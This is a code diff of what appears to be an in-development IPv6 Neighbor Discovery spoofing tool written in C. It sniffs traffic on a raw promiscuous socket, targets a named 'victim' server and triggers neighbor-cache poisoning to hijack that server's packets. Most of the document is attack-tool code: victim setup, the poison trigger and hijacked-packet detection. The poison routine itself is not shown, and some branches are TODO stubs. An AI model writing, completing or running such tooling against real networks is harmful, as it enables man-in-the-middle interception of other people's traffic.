@@ -27,6 +27,13 @@
 
 #define DEBUG 0
 
+
+void termination_handler(int signum) {
+	/* TODO */
+	printf("Sig: %d\nFree everything\n", signum);
+	exit(0);
+}
+
 static int raw_socket(int proto) {
 	int rawsock;
 
@@ -78,21 +85,18 @@ void debug_packet(char *packet) {
 	struct tcphdr *tcp;
 	char addr[INET6_ADDRSTRLEN];
 
-//	eth = (struct ethhdr *)packet;
-//	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
-
-	ip6 = (struct ip6_hdr *)(packet);
-	printf("DEBUG33: %d\n", ip6->ip6_nxt);
+	eth = (struct ethhdr *)packet;
+	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 
 	if (ip6->ip6_nxt != IPPROTO_TCP && ip6->ip6_nxt != IPPROTO_ICMPV6)
 		return;
 
 	printf("\n- PACKET START -\n");
-/*
+
 	printf("Ethernet:\n");
 	printf("\tEther src: %s\n", ether_ntoa((struct ether_addr *)eth->h_source));
 	printf("\tEther dest: %s\n", ether_ntoa((struct ether_addr *)eth->h_dest));
-*/
+
 	printf("IPv6:\n");
 	inet_ntop(AF_INET6, ip6->ip6_dst.s6_addr, addr, INET6_ADDRSTRLEN);
 	printf("\tTo: %s\n", addr);
@@ -126,27 +130,28 @@ void packet_action(char *packet) {
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmpv6;
 	struct tcphdr *tcp;
-	unsigned short crc;
-	struct cli_victim *cli;
 
-	//debug_packet(packet);
+	debug_packet(packet);
 
 	eth = (struct ethhdr *)packet;
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
-	icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 
-	printf("DEBUG: 0x%x\n", icmpv6->icmp6_cksum);
-	icmpv6->icmp6_cksum = 0;
-	printf("DEBUG1: 0x%x\n", icmp6_cksum(ip6));
 
 	/* Pacote para nossa vitima. */
 	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
+
 		/* Se o mac destino for o do atacante, é pacote roubado */
 		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 			/* TODO */
 			printf("Packet Hijacked? :-)\n");
 		} else if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
 			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+
+			/* CRC Debug */
+			printf("DEBUG: 0x%x\n", icmpv6->icmp6_cksum);
+			icmpv6->icmp6_cksum = 0;
+			printf("DEBUG1: 0x%x\n", icmp6_cksum(ip6));
+
 			/* Se for uma solicitação de discover e o cliente ainda não foi
 			 * "poisoned", dispara o poison. */
 			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
@@ -155,12 +160,19 @@ void packet_action(char *packet) {
 			}
 		}
 	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
+
 		/* Pacote enviado pela nossa vitima. */
-		if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
-			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-			if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
-				printf("Se não tivermos pegado o MAC do server, esse é o momento.\n");
-			}
+		switch (ip6->ip6_nxt) {
+			case IPPROTO_ICMPV6:
+				icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+				if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
+					printf("Se não tivermos pegado o MAC do server, esse é o momento.\n");
+				}
+				break;
+			case IPPROTO_TCP:
+				tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
+				/* TODO */
+				break;
 		}
 	}
 
@@ -188,6 +200,15 @@ int main(int argc, char **argv) {
 	char server_victim[INET6_ADDRSTRLEN];
 	int packet_info_size = sizeof(packet_info);
 
+	struct sigaction saction;
+
+	/* Set up the structure to specify the new action. */
+	saction.sa_handler = termination_handler;
+	sigemptyset(&saction.sa_mask);
+	saction.sa_flags = 0;
+
+	sigaction(SIGINT, &saction, NULL);
+
 	if (argc < 3) {
 		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
 		exit(0);
@@ -195,7 +216,6 @@ int main(int argc, char **argv) {
 
 	load_device_info(argv[1]);
 	dump_device_info();
-	init_cvictim();
 
 	/* create the raw socket */
 	raw = raw_socket(ETH_P_IPV6);
@@ -203,13 +223,8 @@ int main(int argc, char **argv) {
 	/* Bind socket to interface and going promisc */
 	bind_socket_to_device(device.name, raw);
 
-	/* Get number of packets to sniff from user */
-	if (inet_pton(AF_INET6, argv[2], &svictim.ipv6) <= 0) {
-		printf("Error setting victim's address\n");
-		exit(EXIT_FAILURE);
-	}
-	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
-	printf("Server to attack: %s\n", server_victim);
+	init_svictim(argv[2]);
+	init_cvictim();
 
 #if 0
 	/* START DEBUG TESTE */
